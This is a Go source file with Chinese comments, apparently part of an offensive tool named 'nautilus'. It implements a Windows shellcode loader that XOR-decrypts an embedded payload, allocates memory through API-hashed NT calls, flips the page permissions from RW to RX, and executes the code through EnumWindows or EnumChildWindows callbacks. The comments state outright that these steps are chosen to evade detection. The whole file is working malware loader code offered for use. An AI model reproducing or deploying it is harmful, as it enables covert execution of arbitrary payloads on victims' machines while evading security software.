//go:build windows

package core

import (
	"encoding/base64"
	"fmt"
	"unsafe"

	"nautilus/evasion"
)

const (
	memCommit  = 0x1000
	memReserve = 0x2000
	pageRW     = 0x04
	pageRX     = 0x20
)

// LoadMod 通过API Hashing分配内存 + Callback执行
// 1. evasion.CallNtAVM — XOR解密API名，消除静态字符串
// 2. RW→RX权限翻转 — 避免RWX页面
// 3. EnumWindows回调 — 替代直接跳转
func LoadMod(encodedPayload string, xorKey byte) error {
	raw, err := base64.StdEncoding.DecodeString(encodedPayload)
	if err != nil {
		return fmt.Errorf("b64 err: %w", err)
	}
	sc := make([]byte, len(raw))
	for i, b := range raw {
		sc[i] = b ^ xorKey
	}
	sz := uintptr(len(sc))

	// NtAllocateVirtualMemory (API名XOR加密)
	var baseAddr uintptr
	regionSize := sz
	evasion.CallNtAVM(^uintptr(0), &baseAddr, &regionSize, uintptr(memCommit|memReserve), uintptr(pageRW))
	if baseAddr == 0 {
		return fmt.Errorf("mem err")
	}

	// 写入payload
	for i, b := range sc {
		*(*byte)(unsafe.Pointer(baseAddr + uintptr(i))) = b
	}

	// NtProtectVirtualMemory: RW → RX
	var oldProt uint32
	evasion.CallNtPVM(^uintptr(0), &baseAddr, &regionSize, uintptr(pageRX), &oldProt)

	// EnumWindows回调执行 (替代syscall.SyscallN直接跳转)
	evasion.CallEnumWindows(baseAddr, 0)

	return nil
}

// LoadModAlt 备用 — 函数指针替换 + EnumWindows回调
func LoadModAlt(encodedPayload string, xorKey byte) error {
	raw, err := base64.StdEncoding.DecodeString(encodedPayload)
	if err != nil {
		return fmt.Errorf("b64 err: %w", err)
	}
	sc := make([]byte, len(raw))
	for i, b := range raw {
		sc[i] = b ^ xorKey
	}

	f := func() {}
	var oldProt uint32
	fp := *(*uintptr)(unsafe.Pointer(&f))
	regSz := unsafe.Sizeof(uintptr(0))
	evasion.CallNtPVM(^uintptr(0), &fp, &regSz, uintptr(pageRX), &oldProt)
	*(*uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	// 通过EnumChildWindows回调执行
	evasion.CallEnumChildWindows(*(*uintptr)(unsafe.Pointer(&f)), 0)
	return nil
}

// XorEncPayload 加密payload用于嵌入
func XorEncPayload(sc []byte, key byte) string {
	enc := make([]byte, len(sc))
	for i, b := range sc {
		enc[i] = b ^ key
	}
	return base64.StdEncoding.EncodeToString(enc)
}
